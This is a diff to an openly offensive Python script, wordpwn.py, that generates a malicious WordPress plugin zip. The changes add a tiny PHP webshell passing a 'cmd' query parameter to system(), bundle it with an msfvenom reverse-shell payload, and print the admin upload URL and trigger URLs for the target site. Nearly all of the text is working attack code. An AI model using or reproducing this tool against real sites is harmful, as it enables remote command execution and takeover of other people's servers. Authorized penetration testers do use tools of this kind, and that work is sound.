@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
 #
 # Script name     : wordpwn.py
-# Version         : 2.2
+# Version         : 2.3
 # Created date    : 3/1/2017
-# Last update     : 30/05/2020
+# Last update     : 10/02/2024
 # Author          : wetw0rk & 3isenHeiM
+# Contributors    : 34ZY
 # Inspired by     : Metasploit admin shell upload
 # Python version  : 3.7
-# Description     : Simply generates a wordpress plugin that will grant you a reverse shell
-#                   once uploaded. I reccomend installing Kali Linux, as msfvenom is used
+# Description     : Simply generates a wordpress plugin that will grant you a reverse shell and integrate a webshell
+#                   once uploaded. I recommend installing Kali Linux, as msfvenom is used
 #                   to generate the payload.
 #
 
@@ -61,7 +62,25 @@ def generate_plugin(LHOST, LPORT, PAYLOAD):
 	plugin_file = open('QwertyRocks.php','w')
 	plugin_file.write(plugin_script)
 	plugin_file.close()
-	# Generate Payload
+	
+	# Generate Webshell payload
+	print("[+] Generating webshell payload")
+	plugin_script = "<?php\n"
+	plugin_script += "/**\n"
+	plugin_script += " * Plugin Name: %s\n" % ('GotYaAll')
+	plugin_script += " * Version: %d.%d.%d\n" % (random.randint(1, 10), random.randint(1, 10), random.randint(1, 10))
+	plugin_script += " * Author: 34ZY\n"
+	plugin_script += " * Author URI: https://github.com/34zY\n"
+	plugin_script += " * License: GPL2\n"
+	plugin_script += " */\n"
+	plugin_script += "system($_GET['cmd']);" # Tiny Webshell content
+	plugin_script += "?>\n"
+	print("[+] Writing plugin script to file")
+	plugin_file = open('SWebTheme.php','w')
+	plugin_file.write(plugin_script)
+	plugin_file.close()
+
+	# Generate MSF Payload
 	print("[+] Generating payload To file")
 	create_payload = subprocess.Popen(
 		['msfvenom', '-p', PAYLOAD, LHOST, LPORT,
@@ -72,18 +91,22 @@ def generate_plugin(LHOST, LPORT, PAYLOAD):
 	payload_file.write(create_payload)
 	payload_file.write(b" ?>")
 	payload_file.close()
+
+
 	# Create Zip With Payload
 	print("[+] Writing files to zip")
 	make_zip = zipfile.ZipFile('malicious.zip', 'w')
+	make_zip.write('SWebTheme.php')
 	make_zip.write('wetw0rk_maybe.php')
 	make_zip.write('QwertyRocks.php')
 	print("[+] Cleaning up files")
-	os.system("rm QwertyRocks.php wetw0rk_maybe.php")
+	os.system("rm QwertyRocks.php wetw0rk_maybe.php SWebTheme.php")
 	# Useful Info
 	print("[+] URL to upload the plugin: http://(target)/wp-admin/plugin-install.php?tab=upload")
 	print("[+] How to trigger the reverse shell : ")
 	print("      ->   http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php")
 	print("      ->   http://(target)/wp-content/plugins/malicious/QwertyRocks.php")
+	print("      ->   http://(target)/wp-content/plugins/malicious/SWebTheme.php?cmd=ls")
 
 
 def handler(LHOST, LPORT, PAYLOAD):
